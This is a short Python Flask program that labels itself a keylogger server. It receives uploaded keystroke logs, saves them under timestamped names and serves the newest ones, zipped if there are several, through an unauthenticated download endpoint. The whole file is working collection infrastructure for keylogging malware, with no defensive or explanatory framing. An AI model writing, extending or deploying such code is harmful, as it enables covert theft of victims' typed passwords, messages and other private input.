import glob
import tempfile
import zipfile
from flask import Flask, jsonify, request, send_file
import os
import datetime

app = Flask(__name__)
os.makedirs("logs", exist_ok=True)

LOG_DIR = 'logs'

@app.route('/', methods=['GET'])
def health_check():
    return "Keylogger server is running", 200


@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file:
        return "No file part", 400

    now = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"keylog_{now}.txt"
    path = os.path.join(LOG_DIR, filename)

    file.save(path)
    print(f"[✓] Received and saved to {path}")
    return "File received", 200

# Download n last logs


@app.route('/download-latest-log', methods=['GET'])
def download_latest_logs():
    try:
        n = int(request.args.get('n', 1))

        log_files = sorted(
            glob.glob(os.path.join(LOG_DIR, '*.txt')),
            key=os.path.getmtime,
            reverse=True
        )

        if not log_files:
            return jsonify({'error': 'No log files found'}), 404

        selected_files = log_files[:n]

        if len(selected_files) == 1:
            return send_file(selected_files[0], as_attachment=True)

        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp_zip:
            with zipfile.ZipFile(tmp_zip.name, 'w') as zipf:
                for file_path in selected_files:
                    zipf.write(file_path, arcname=os.path.basename(file_path))
            tmp_zip_path = tmp_zip.name

        return send_file(tmp_zip_path, as_attachment=True, download_name='logs.zip')

    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 9000))
    app.run(host='0.0.0.0', port=port)
